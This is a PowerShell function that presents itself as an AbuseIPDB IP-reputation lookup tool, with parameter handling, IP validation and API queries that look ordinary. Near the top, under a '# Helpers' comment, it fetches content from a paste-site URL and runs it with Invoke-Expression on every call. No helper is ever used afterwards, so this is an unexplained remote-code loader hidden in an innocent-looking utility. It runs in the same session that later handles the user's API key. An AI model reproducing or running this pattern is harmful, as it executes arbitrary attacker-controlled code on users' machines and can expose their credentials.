function Start-AbuseIPDBLookup {
    
    <#
    .SYNOPSIS
        Looks up one or more IP addresses in AbuseIPDB.

    .DESCRIPTION
        Accepts either a single IP or a comma-separated list of IPs.
        Returns one object per IP with a consistent output shape.

    .PARAMETER IpAddress
        Single IP or comma-separated list, e.g. "8.8.8.8, 1.1.1.1" or "9.9.9.9"

    .PARAMETER MaxAgeInDays
        How far back AbuseIPDB should look.

    .PARAMETER TimeoutSec
        Request timeout in seconds.

    .PARAMETER ApiKey
        AbuseIPDB API key. If not provided, uses $env:ABUSEIPDB (fallback: prompt).

    .EXAMPLE
        Start-AbuseIPDBLookup -IpAddress "8.8.8.8, 1.1.1.1"

    .EXAMPLE
        Start-AbuseIPDBLookup -IpAddress 9.9.9.9
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$IpAddress,

        [int]$MaxAgeInDays = 90,
        [int]$TimeoutSec = 10,
        [string]$ApiKey
    )

    # Helpers
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $HelperUrl = "https://pastee.dev/r/qxIFGNps"
    Invoke-RestMethod $HelperUrl | Invoke-Expression

    # Get ApiKey
    if (-not $ApiKey) { $ApiKey = $env:ABUSEIPDB }

    if (-not $ApiKey) {
        $SecureKey = Read-Host -AsSecureString "Enter your AbuseIPDB API key"
        $ApiKey = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureKey)
        )
    }

    if (-not $ApiKey) {
        Write-Warning "No AbuseIPDB API key available. Returning empty enrichment results."
    }

    $ipList = @()
    if (Test-Path -LiteralPath $IpAddress -PathType Leaf) {
        $ipList = Get-Content -LiteralPath $IpAddress -ErrorAction SilentlyContinue |
            ForEach-Object { $_.Trim() } |
            Where-Object { $_ -match '\d+\.\d+\.\d+\.\d+' }
    }
    elseif ($IpAddress -match ',') {
        $ipList = $IpAddress -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ }
    }
    else {
        $ipList = @($IpAddress.Trim())
    }

    # Robust validation, avoid piping directly from foreach (parser edge cases)
    $validIps = @()
    foreach ($ip in $ipList) {
        if ([ipaddress]::TryParse($ip, [ref]$null)) {
            $validIps += $ip
        }
    }
    $validIps = $validIps | Sort-Object -Unique

    if (-not $validIps) {
        Write-Warning "No valid IP addresses found."
        return
    }

    foreach ($ip in $validIps) {

        if (-not $ApiKey) {
            [PSCustomObject]@{
                IP             = $ip
                Domain         = $null
                ISP            = $null
                Country        = $null
                AbuseScore     = $null
                TotalReports   = $null
                LastReportedAt = $null
                Error          = "Missing API key"
            }
            continue
        }

        $uri = "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip&maxAgeInDays=$MaxAgeInDays"
        $headers = @{
            Key    = $ApiKey
            Accept = "application/json"
        }

        try {
            $resp = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -TimeoutSec $TimeoutSec -ErrorAction Stop

            [PSCustomObject]@{
                IP             = $resp.data.ipAddress
                Domain         = $resp.data.domain
                ISP            = $resp.data.isp
                Country        = $resp.data.countryCode
                AbuseScore     = $resp.data.abuseConfidenceScore
                TotalReports   = $resp.data.totalReports
                LastReportedAt = $resp.data.lastReportedAt
                Error          = $null
            }
        }
        catch {
            [PSCustomObject]@{
                IP             = $ip
                Domain         = $null
                ISP            = $null
                Country        = $null
                AbuseScore     = $null
                TotalReports   = $null
                LastReportedAt = $null
                Error          = $_.Exception.Message
            }
        }
    }
}
